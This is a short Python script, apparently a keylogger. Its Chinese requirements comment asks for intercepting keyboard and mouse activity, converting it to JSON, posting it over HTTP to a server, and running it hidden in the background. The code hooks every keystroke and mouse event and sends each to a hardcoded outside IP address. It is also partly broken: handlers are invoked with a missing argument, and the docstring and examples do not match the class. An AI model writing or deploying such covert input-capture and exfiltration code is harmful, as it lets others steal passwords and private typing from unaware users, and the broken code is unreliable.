#!/usr/bin/env python3
# -*- coding-utf-8 -*-

'''
需求：
1. 截获键盘与鼠标操作
2. 截获信息后，转换为JSON 格式，通过HTTP 发送到服务器
3. 后台运行python 脚本（可考虑添加后台服务）
'''
import os
import fire
from loguru import logger

import pyHook
import pythoncom
from flask_client_json import http_post_json


class KeysetAMouse(object):
    """
    A class that represents a IP address

    Example:
        python keyset_a_mouse.py
        # python keyset_a_mouse.py main
        # python3 keyset_a_mouse.py show_ips --ips_filepath /tmp/ips.txt
    """
    def __init__(self, host = None, hosts = None):
        self.host = host
        self.hosts = hosts

    def OnKeyboardEvent(self, ip, event):
        key_board_event = {
            'MessageType':'KeyboardEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Key':event.Key
        }
        http_post_json(ip, key_board_event)
        return True

    def OnMouseEvent(self, ip, event):
        mouse_event = {
            'MessageType':'MouseEvent',
            'MessageName':event.MessageName,
            'Time':event.Time,
            'Position':event.Position # event.Wheel
        }
        http_post_json(ip, mouse_event)
        return True

    def main(self):
        ip = '202.100.1.224'
        hm = pyHook.HookManager() # create a hook manager
        hm.KeyDown = self.OnKeyboardEvent(ip) # watch for all keyboard events
        hm.HookKeyboard() # set the hook
        hm.MouseAll = self.OnMouseEvent(ip) # watch for all mouse events
        hm.HookMouse() # set the hook
        pythoncom.PumpMessages() # wait forever

if __name__ == '__main__':
    fire.Fire(KeysetAMouse)

